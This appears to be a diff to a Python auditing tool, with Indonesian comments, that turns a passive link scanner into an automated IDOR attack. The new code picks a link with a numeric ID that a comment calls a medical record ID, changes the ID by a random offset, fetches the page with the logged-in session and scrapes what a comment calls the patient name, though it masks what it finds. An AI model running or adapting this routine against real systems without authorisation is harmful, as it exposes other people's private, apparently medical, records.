@@ -7,6 +7,8 @@ import json
 import threading
 from concurrent.futures import ThreadPoolExecutor
 import time
+import random
+import re
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -140,23 +142,47 @@ def parameter_discovery_audit():
         soup = BeautifulSoup(res.text, 'html.parser')
         links = soup.find_all('a', href=True)
         
-        discovered = []
-        print(f"\n[+] Analyzing {len(links)} internal links for tamperable parameters...")
-        
+        # Mencari tautan yang mengandung pola angka (ID Rekam Medis)
+        potential_targets = []
         for link in links:
             href = link['href']
-            # Mencari pola URL yang memiliki angka (ID) atau query string (?)
-            if any(char.isdigit() for char in href) or "?" in href:
-                if href not in discovered and "logout" not in href.lower():
-                    discovered.append(href)
-                    
-        if discovered:
-            print(f"[*] Found {len(discovered)} potential targets for Parameter Tampering:\n")
-            for d in discovered:
-                param_type = "Query String" if "?" in d else "Path Variable (ID)"
-                print(f" [\033[93m!\033[0m] URL   : {d}")
-                print(f"     Type  : {param_type}")
-                print(f"     Status: \033[93mReady for Manipulation Test\033[0m\n")
+            match = re.search(r'/(\d{6,12})', href)
+            if match and "logout" not in href.lower():
+                potential_targets.append((href, match.group(1)))
+        
+        if potential_targets:
+            print(f"\n[+] Detected {len(potential_targets)} potential Path Variable targets.")
+            
+            # 1. Randomization: Memilih satu target secara acak untuk diuji
+            base_url, original_id = random.choice(potential_targets)
+            masked_original = "*" * (len(original_id) - 1) + original_id[-1]
+            print(f"[*] Random Target Selected: {base_url.replace(original_id, masked_original)}")
+            
+            # 2. Automated Manipulation Test
+            print(f"[*] Executing Automated Manipulation Test (ID Tampering)...")
+            
+            # Generate ID baru dengan offset acak
+            offset = random.choice([x for x in range(-100, 101) if x != 0])
+            test_id = str(int(original_id) + offset).zfill(len(original_id))
+            test_url = base_url.replace(original_id, test_id)
+            
+            test_res = session.get(test_url, timeout=10)
+            test_soup = BeautifulSoup(test_res.text, 'html.parser')
+            
+            # Mendeteksi apakah manipulasi berhasil (mencari tag nama pasien)
+            name_tag = test_soup.find('p', class_='sale-price text-success')
+            masked_test_id = "*" * (len(test_id) - 1) + test_id[-1]
+            
+            if name_tag:
+                name = name_tag.get_text(strip=True)
+                masked_name = f"{name[:2].upper()}..{name[-2:].upper()}"
+                print(f"\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
+                print(f" [!] Manipulated ID : {masked_test_id}")
+                print(f" [!] Discovered Data: {masked_name}")
+                print(f" [!] Vulnerability  : \033[91mIDOR Confirmed\033[0m\n")
+            else:
+                print(f"\n[\033[93m!\033[0m] Manipulation Test Completed for ID {masked_test_id}.")
+                print(f" [!] Result         : No data extracted (Status: {test_res.status_code})\n")
         else:
             print("[!] No obvious tamperable parameters found on the dashboard.")
     except Exception as e:
